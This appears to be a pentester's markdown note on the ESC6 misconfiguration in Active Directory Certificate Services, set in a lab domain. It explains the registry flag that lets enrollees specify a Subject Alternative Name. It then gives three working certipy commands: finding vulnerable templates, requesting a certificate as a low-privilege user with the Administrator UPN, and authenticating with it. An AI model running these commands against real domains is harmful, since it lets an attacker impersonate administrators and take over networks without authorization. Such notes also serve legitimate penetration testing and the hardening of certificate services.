---
title: ESC6
tags:
  - esc
  - adcs
---
### ESC6
This only applies to a CA that has an attribute `EDITF_ATTRIBUTEALTNAME2` in registry value. Registry path is at `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\range-CA01-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`. This attribute means that even when a template is configured to use an AD Object Subject Name, we could specify a Subject Alternative Name. This also means that all templates will be vulnerable

1. Find a vunlerable template with **certi**. The output of a vunlerable template to ESC6 will be as follows.
```bash
certipy find -u peter@range.net -p Password123 -dc-ip 192.168.86.183 -vulnerable -enabled -stdout
[[..snip..]]
ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
[[..snip..]]
```
2. Request a certificate with an Alternative Subject Name *(upn)*
```bash
certipy req -u peter@range.net -p Password123 -target ca01.range.net -ca 'range-CA01-CA' -template 'User' -upn 'Administrator@range.net'
```
3. Authenticate with the template retrieved.
```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.86.183
```
